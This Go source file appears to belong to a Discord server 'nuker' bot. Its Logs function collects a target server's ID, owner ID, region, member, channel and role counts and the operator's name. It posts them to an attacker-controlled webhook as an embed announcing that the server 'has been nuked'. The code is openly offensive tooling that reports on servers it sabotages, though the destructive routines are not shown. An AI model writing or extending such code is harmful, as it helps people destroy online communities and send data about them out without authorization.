package start_end

import (
	"Dynamic/core/requests"
	"encoding/json"
	"fmt"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Logs(s *discordgo.Session, m *discordgo.MessageCreate) {

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	godotenv.Load()
	AVATAR_URL := os.Getenv("AVATAR_URL")
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	channels, _ := s.GuildChannels(guild.ID)
	textChannels := len(channels)

	roles, _ := s.GuildRoles(guild.ID)
	rolesInt := len(roles)

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:     "Server " + fmt.Sprint(guild.Name) + " has been nuked.",
		Thumbnail: &thumbnail,
		Color:     00255,
		Description: "> **Server ID:** " + "`" + fmt.Sprint(guild.ID) + "`\n" +
			"> **Owner ID:** " + "`" + fmt.Sprint(guild.OwnerID) + "`\n" +
			"> **Region:** " + "`" + fmt.Sprint(guild.Region) + "`\n" +
			"> **Nuker:** " + "`" + fmt.Sprint(m.Author) + "`\n" +
			"\n" +
			"> **All Members:** " + "`" + fmt.Sprint(guild.MemberCount) + "`\n" +
			"> **All Channels:** " + "`" + fmt.Sprint(textChannels) + "`\n" +
			"> **All Roles:** " + "`" + fmt.Sprint(rolesInt) + "`\n" +
			"\n" +
			"> **Joined At:** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, _ := json.Marshal(data)

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}
